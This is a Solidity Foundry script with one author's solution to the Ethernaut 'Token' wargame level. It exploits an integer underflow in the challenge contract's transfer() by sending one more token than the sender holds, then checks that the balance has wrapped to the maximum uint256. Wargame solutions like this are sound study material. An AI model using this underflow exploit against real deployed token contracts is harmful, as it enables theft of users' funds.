// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Challenge Contract Interface)
////////////////////////////////////////////////////////////////////////////////////
// Use import will introduce `incompatible Solidity versions` error
interface Token {
    // Function to transfer tokens to a specified address
    function transfer(address _to, uint _value) external returns (bool);

    // Function to check the balance of a specified address
    function balanceOf(address _owner) external view returns (uint balance);

    // State variable for the total supply of tokens (not accessible directly)
    function totalSupply() external view returns (uint);
}

////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Challenge Contract Interface)
////////////////////////////////////////////////////////////////////////////////////

contract TokenSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x478f3476358Eb166Cb7adE4666d04fbdDB56C407;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        address receipient = 0x7E60F5E4544F8817A1D49bD3bB14c1EE2E7537cC;
        uint amount = 20;

        // Step 1: Get Token contract;
        Token token = Token(challengeInstance);

        // Step 2: Call `transfer()` function of Token contract,
        //         transfer value bigger than account balance to cause overflow;
        token.transfer(receipient, amount + 1);

        // Step 3: Confirm that caller `heroAddress` has successfully obtained excess tokens.
        address heroAddress = vm.addr(heroPrivateKey);
        require(
            token.balanceOf(heroAddress) == 2 ** 256 - 1,
            "Balance check failed"
        );

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(5));
    }
}
